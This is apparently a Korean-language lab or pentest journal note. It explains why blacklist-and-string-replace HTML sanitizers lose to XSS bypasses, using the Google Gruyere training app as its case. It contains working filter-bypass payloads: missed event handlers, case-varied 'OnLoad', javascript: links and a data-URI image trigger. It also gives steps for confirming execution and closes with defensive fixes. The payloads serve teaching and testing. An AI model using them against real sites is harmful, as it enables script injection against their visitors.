# XSS Filter Bypass — 블랙리스트 + 문자열 치환이 구조적으로 지는 이유

## 원리

앱이 "차단 목록(blacklist) + 문자열 치환"으로 HTML 을 정화하면, 실패 모드가 **구조적으로**
여러 개 생긴다. 하나를 고쳐도 나머지가 남는다.

| 실패 모드 | 원인 | 예 |
|---|---|---|
| **목록 누락** | 차단 목록은 열거라서 빠뜨린 항목이 통과 | `onerror`, `oninput`, `ontoggle`, `onanimationstart` … |
| **대소문자 구분** | `t.replace('onload','blocked')` 는 `OnLoad` 를 못 잡음 | HTML 속성명은 대소문자를 구분하지 않음 → 브라우저는 실행 |
| **컨텍스트 무시** | 속성/URL 스킴을 검사하지 않음 | 허용 태그 `a` 의 `href="javascript:..."` |
| **태그 분할 가정** | 정규식이 `<...>` 안에 `>` 가 없다고 가정 | 속성값 안의 `>` 로 파서 혼동 |

즉 "차단 목록을 나열하는 방식" 자체가 근본 원인이다. 허용 목록 + 파서 기반 정규화가 아니면
같은 종류의 우회가 계속 나온다.

## 케이스 A — 방어 코드를 오프라인에서 직접 실행해 판정 (가장 빠른 방법)

정화 함수만 따로 임포트해 **같은 입력에 대한 변환 결과를 나란히** 출력한다. 서버를 때리기
전에 통과/차단이 표로 정리되고, 그 표 자체가 보고서 근거가 된다.

```bash
python3 -c "
import sys; sys.path.insert(0,'<src_dir>'); import sanitize
for p in ['<img src=x onerror=alert(1)>',
          '<img src=x OnLoad=alert(1)>',
          '<img src=x onload=alert(1)>',
          '<a href=\"javascript:alert(1)\">x</a>']:
    print(repr(p), '→', repr(sanitize.SanitizeHtml(p)))
"
```
실측 결과(예):
```
'<img src=x onerror=alert(1)>' → '<img src=x onerror=alert(1)>'   # 목록 누락 → 통과
'<img src=x OnLoad=alert(1)>'  → '<img src=x OnLoad=alert(1)>'    # 대소문자 → 통과
'<img src=x onload=alert(1)>'  → '<img src=x blocked=alert(1)>'   # 정확한 소문자만 차단
'<a href="javascript:alert(1)">x</a>' → 원문 그대로                # 스킴 미검증
```

## 케이스 B — 실제 실행까지 닫는 3단 검증

"정화기를 통과했다"와 "브라우저에서 실행됐다"는 **다른 명제**다. 반드시 3단으로 나눠 닫는다.

1. **오프라인 단위검사** — 코드상 통과 확인(케이스 A)
2. **실서버 저장·보존 확인** — 저장형이면 저장 후 응답 원문에 페이로드가 그대로 남았는지
   (`grep -o "OnLoad=[^>]*"` 등). 반사형이면 응답 본문에서 컨텍스트 확인
3. **브라우저 실행** — DOM 마커로 확인. 자동 발화가 필요하면 로드가 확실한 리소스를 쓴다.

```html
<!-- 1x1 gif data URI 를 쓰면 네트워크 의존 없이 onload 가 확실히 발화한다 -->
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
     OnLoad="document.title='XSS-PROOF'">
```
```javascript
// 판정: 제목/DOM 마커 (스크린샷보다 명확하고 텍스트 증거로 남는다)
document.title                                   // "XSS-PROOF"
document.querySelectorAll('img')[0].hasAttribute('OnLoad')   // true
```

**(1)만으로 "취약"이라 쓰면 과대주장이 된다.** 실제로 템플릿/JSON 응답을 브라우저로 직접
열면 실행되지 않는 경우(HTML 로 파싱됨)가 있으므로, 실행 경로까지 확인해야 한다.

## 케이스 C — 검증은 비인증 세션으로도

저장형이라면 **로그인하지 않은 세션**으로 확인한다. "작성자 본인만 피해자"인 self-XSS 와
"모든 방문자가 피해자"는 심각도가 크게 다르다. 로그인 마커(프로필/로그아웃 링크 존재 여부)를
같이 기록해 두면 보고서에서 피해 범위를 명시할 수 있다.

## 확인된 사례

- 재확인된 사례: `google-gruyere-trial` (Round 5/10 — 저장형 스니펫 XSS 는 `onerror` 가
  차단 목록에 없어서였고, Round 10 에서 `OnLoad` 대소문자 우회로 "방어가 무력함"을 별도로
  증명. 비인증 방문자 브라우저에서 실행 확인. 커스텀 `SanitizeHtml` 정규식/문자열 치환).

## 방어 관점 메모

- 블랙리스트·정규식 치환을 버리고 **허용 목록 + 검증된 HTML 파서**로 정규화한다.
- 허용 태그의 URL 스킴(`href`/`src`)을 http/https·상대경로로 제한한다.
- 이벤트 속성(`on*`)은 허용 목록에도 넣지 않는다(브라우저는 대소문자를 구분하지 않는다는
  점을 항상 전제).
- CSP 를 2차 방어로 두고, 세션 쿠키에 HttpOnly 를 설정해 XSS→세션 탈취 체인을 끊는다.

<!-- 출처: journal/web/google-gruyere-trial/, Round 4 / Round 5 / Round 10 -->
